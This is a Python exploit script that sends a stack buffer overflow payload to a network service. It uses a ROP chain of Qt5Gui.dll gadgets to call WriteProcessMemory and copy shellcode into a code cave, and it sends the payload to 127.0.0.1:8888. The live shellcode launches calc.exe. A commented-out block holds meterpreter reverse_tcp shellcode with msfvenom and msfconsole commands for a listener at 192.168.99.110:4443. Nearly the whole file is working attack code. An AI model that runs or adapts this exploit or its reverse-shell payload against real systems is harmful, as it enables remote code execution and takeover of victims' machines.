#!/usr/local/bin/python3
import sys
from socket import *
import logging
from struct import pack

logging.basicConfig(level=logging.DEBUG, format="[*] %(funcName)s - %(message)s")

log = logging.getLogger(__name__)

total = 2500
offset = 1052

host = b"127.0.0.1"
port = 8888

def BeautyOpcodes(shellcode):
    hex_string = ' '.join(['{:02X}'.format(byte) for byte in shellcode])
    return hex_string
    
def GetWriteProcessMemoryTemplate() -> bytes:
    codeCaveAd = 0x61f8e9bc

    wpm  = pack('<L', 0x45454545)   # dummy WriteProcessMemory Address
    wpm += pack('<L', codeCaveAd)   # Shellcode Return Address
    wpm += pack('<L', 0xFFFFFFFF)   # hProcess Pseude Process Handle (-1 for the current process)
    wpm += pack('<L', codeCaveAd)   # lpBaseAddressCode Cave Address (= Shellcode RET Address)
    wpm += pack('<L', 0x47474747)   # dummy lpBuffer (Stack Address)
    wpm += pack('<L', 0x48484848)   # dummy nSize
    wpm += pack('<L', 0x49494949)   # lpNumberOfBytesWritten

    return wpm

def GetROP() -> bytes:
    #
    # 1. Get ESP
    #
    rop  = pack("<L", 0x61df6cdf) # Qt5Gui.dll :: push esp ; pop ebx ; pop esi ; ret  ;
    rop += pack("<L", 0xFFFFFFE0) # -0x20
    rop += pack("<L", 0x61defd15) # Qt5Gui.dll :: add ebx, esi ; ret  ; ===> EBX = ESP - 0x20 (Address WPM Template)
    
    #
    # 2. Find WriteProcessMemory
    #
    rop += pack("<L", 0x61b6122a) # Qt5Gui.dll :: pop eax ; ret  ; ===> EAX = IAT Kernel32!ExitProcess
    rop += pack("<L", 0x6210b050) # IAT Kernel32!ExitProcess
    rop += pack("<L", 0x61bb8cb3) # Qt5Gui.dll :: mov eax, dword [eax] ; ret  ; ===> EAX = Address Kernel32!ExitProcess
    rop += pack("<L", 0x61b55c73) # Qt5Gui.dll :: pop ecx ; ret  ; ===> ECX = Offset WPM - ExitProcess Address
    rop += pack("<L", 0xfffef430) # Offset = WriteProcessMemory - ExitProcess
    rop += pack("<L", 0x61c49e73) # Qt5Gui.dll :: sub eax, ecx ; ret  ; ==> EAX = WriteProcessMemory Address
    
    #
    # 3. Patch WriteProcessMemory in WPM Template
    #
    rop += pack("<L", 0x61dcffca) # Qt5Gui.dll :: xchg eax, edx ; ret  ; ==> EDX = WriteProcessMemory Address
    rop += pack("<L", 0x61b460dc) # Qt5Gui.dll :: xchg eax, ebx ; ret  ; ==> EAX = Address WPM Template
    rop += pack("<L", 0x61ef8347) # Qt5Gui.dll :: mov dword [eax], edx ; ret  ;
    
    #
    # 4. Patch lpBuffer
    #
    # EAX = Address WPM Template
    rop += pack("<L", 0x61b55c73) # Qt5Gui.dll :: pop ecx ; ret  ;
    rop += pack("<L", 0xffffff10) # -0xf0 / 0n240
    rop += pack("<L", 0x61c49e73) # Qt5Gui.dll :: sub eax, ecx ; ret  ;  ===> EAX = lpBuffer Addr
    rop += pack("<L", 0x61dcffca) # Qt5Gui.dll :: xchg eax, edx ; ret  ; ===> EDX = lpBuffer Addr
    rop += pack("<L", 0x61df6cdf) # Qt5Gui.dll :: push esp ; pop ebx ; pop esi ; ret  ;
    rop += pack("<L", 0xffffffb0) # -0x50
    rop += pack("<L", 0x61defd15) # Qt5Gui.dll :: add ebx, esi ; ret  ; ===> EBX = ESP - 0x50 (Address lpBuffer WPM Template)
    rop += pack("<L", 0x61b460dc) # Qt5Gui.dll :: xchg eax, ebx ; ret  ; EAX = Address lpBuffer WPM Template
    rop += pack("<L", 0x61ef8347) # Qt5Gui.dll :: mov dword [eax], edx ; ret  ;
    
    #
    # 5. Patch nSize in WPM Template
    #
    rop += pack("<L", 0x61df6cdf) # Qt5Gui.dll :: push esp ; pop ebx ; pop esi ; ret  ;
    rop += pack("<L", 0xffffffa0) # -0x60
    rop += pack("<L", 0x61defd15) # Qt5Gui.dll :: add ebx, esi ; ret  ; ===> EBX = ESP - 0x60 (Address nSize WPM Template)
    rop += pack("<L", 0x61b6122a) # Qt5Gui.dll :: pop eax ; ret  ;
    rop += pack("<L", 0xfffffdf4) # -524
    rop += pack("<L", 0x61eed92a) # Qt5Gui.dll :: neg eax ; ret  ;
    rop += pack("<L", 0x61dcffca) # Qt5Gui.dll :: xchg eax, edx ; ret  ; ===> EAX = 524
    rop += pack("<L", 0x61b460dc) # Qt5Gui.dll :: xchg eax, ebx ; ret  ; ===> EAX = nSize WPM Template
    rop += pack("<L", 0x61ef8347) # Qt5Gui.dll :: mov dword [eax], edx ; ret  ;
    
    #
    # Patch lpNumberOfBytesWritten in WPM Template
    #
    rop += pack("<L", 0x61ba4c55) # Qt5Gui.dll :: inc eax ; ret  ;
    rop += pack("<L", 0x61ba4c55) # Qt5Gui.dll :: inc eax ; ret  ;
    rop += pack("<L", 0x61ba4c55) # Qt5Gui.dll :: inc eax ; ret  ;
    rop += pack("<L", 0x61ba4c55) # Qt5Gui.dll :: inc eax ; ret  ;
    rop += pack("<L", 0x61b460dc) # Qt5Gui.dll :: xchg eax, ebx ; ret  ; ===> EBX = Address lpNumberOfBytesWritten WPM Template
    rop += pack("<L", 0x61b6122a) # Qt5Gui.dll :: pop eax ; ret  ;
    rop += pack("<L", 0x9e07164c) # (0x0 - 0x61f8e9b4)
    rop += pack("<L", 0x61eed92a) # Qt5Gui.dll :: neg eax ; ret  ; ===> EAX = 0x61f8e9b4
    rop += pack("<L", 0x61dcffca) # Qt5Gui.dll :: xchg eax, edx ; ret  ; ===> EDX = 0x61f8e9b4
    rop += pack("<L", 0x61b460dc) # Qt5Gui.dll :: xchg eax, ebx ; ret  ; ===> EAX = lpNumberOfBytesWritten WPM Template
    rop += pack("<L", 0x61ef8347) # Qt5Gui.dll :: mov dword [eax], edx ; ret  ;
    
    #
    # Execute WriteProcessMemory
    #
    rop += pack("<L", 0x61e30fe3) # Qt5Gui.dll :: pop edx ; ret  ;
    rop += pack("<L", 0xffffffe8) # -0x18
    rop += pack("<L", 0x61be611b) # Qt5Gui.dll :: add eax, edx ; ret  ;
    rop += pack("<L", 0x61b7a15f) # Qt5Gui.dll :: xchg eax, esp ; ret  ;
    
    return rop
    
def GetPayload() -> bytes:
    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.99.110 LPORT=4443 -f python -v shellcode
    # msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.99.110; set LPORT 4443; exploit"
    
    # shellcode =  b""
    # shellcode += b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2"
    # shellcode += b"\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x31"
    # shellcode += b"\xff\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xc0\xac"
    # shellcode += b"\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
    # shellcode += b"\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c"
    # shellcode += b"\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0"
    # shellcode += b"\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18\x85\xc9"
    # shellcode += b"\x74\x3c\x49\x8b\x34\x8b\x31\xff\x01\xd6\x31"
    # shellcode += b"\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4"
    # shellcode += b"\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58"
    # shellcode += b"\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01"
    # shellcode += b"\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
    # shellcode += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
    # shellcode += b"\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00"
    # shellcode += b"\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
    # shellcode += b"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29"
    # shellcode += b"\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a"
    # shellcode += b"\x0a\x68\xc0\xa8\x63\x6e\x68\x02\x00\x11\x5b"
    # shellcode += b"\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68"
    # shellcode += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57"
    # shellcode += b"\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a"
    # shellcode += b"\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00\x6a"
    # shellcode += b"\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
    # shellcode += b"\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68"
    # shellcode += b"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
    # shellcode += b"\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"
    # shellcode += b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28"
    # shellcode += b"\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b"
    # shellcode += b"\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61"
    # shellcode += b"\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff"
    # shellcode += b"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6"
    # shellcode += b"\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53"
    # shellcode += b"\xff\xd5"

    #shellcode =  b"\xCC\xCC\xCC\xCC"
    
    # msfvenom -p windows/exec --platform windows -a x86 -b '\x00' cmd=calc.exe -v shellcode -f python
    shellcode =  b""
    shellcode += b"\xdd\xc6\xd9\x74\x24\xf4\xb8\x1c\xcc\x66\xef"
    shellcode += b"\x5e\x31\xc9\xb1\x31\x31\x46\x18\x03\x46\x18"
    shellcode += b"\x83\xc6\x18\x2e\x93\x13\xc8\x2c\x5c\xec\x08"
    shellcode += b"\x51\xd4\x09\x39\x51\x82\x5a\x69\x61\xc0\x0f"
    shellcode += b"\x85\x0a\x84\xbb\x1e\x7e\x01\xcb\x97\x35\x77"
    shellcode += b"\xe2\x28\x65\x4b\x65\xaa\x74\x98\x45\x93\xb6"
    shellcode += b"\xed\x84\xd4\xab\x1c\xd4\x8d\xa0\xb3\xc9\xba"
    shellcode += b"\xfd\x0f\x61\xf0\x10\x08\x96\x40\x12\x39\x09"
    shellcode += b"\xdb\x4d\x99\xab\x08\xe6\x90\xb3\x4d\xc3\x6b"
    shellcode += b"\x4f\xa5\xbf\x6d\x99\xf4\x40\xc1\xe4\x39\xb3"
    shellcode += b"\x1b\x20\xfd\x2c\x6e\x58\xfe\xd1\x69\x9f\x7d"
    shellcode += b"\x0e\xff\x04\x25\xc5\xa7\xe0\xd4\x0a\x31\x62"
    shellcode += b"\xda\xe7\x35\x2c\xfe\xf6\x9a\x46\xfa\x73\x1d"
    shellcode += b"\x89\x8b\xc0\x3a\x0d\xd0\x93\x23\x14\xbc\x72"
    shellcode += b"\x5b\x46\x1f\x2a\xf9\x0c\x8d\x3f\x70\x4f\xdb"
    shellcode += b"\xbe\x06\xf5\xa9\xc1\x18\xf6\x9d\xa9\x29\x7d"
    shellcode += b"\x72\xad\xb5\x54\x37\x41\xfc\xf5\x11\xca\x59"
    shellcode += b"\x6c\x20\x97\x59\x5a\x66\xae\xd9\x6f\x16\x55"
    shellcode += b"\xc1\x05\x13\x11\x45\xf5\x69\x0a\x20\xf9\xde"
    shellcode += b"\x2b\x61\x9a\x81\xbf\xe9\x73\x24\x38\x8b\x8b"
    
    rop_chain = GetROP()

    wpm_placeholder = GetWriteProcessMemoryTemplate()

    payload  = b"\x41" * (offset - len(wpm_placeholder))
    payload += wpm_placeholder
    payload += rop_chain
    payload += b"\x90" * 0x20
    payload += shellcode
    payload += b"\x90" * (total - len(payload))

    return payload

def main():
    buf = GetPayload()

    log.info ("\n[!] Connecting to %s:%s ..." % (host, port))

    s = socket(AF_INET, SOCK_STREAM)
    s.connect((host, port))

    log.info ("[!] Sending the packet...")

    s.send(buf)
    s.close()

    log.info("[+] Packet sent")
    sys.exit(0)

if __name__ == "__main__":
    main()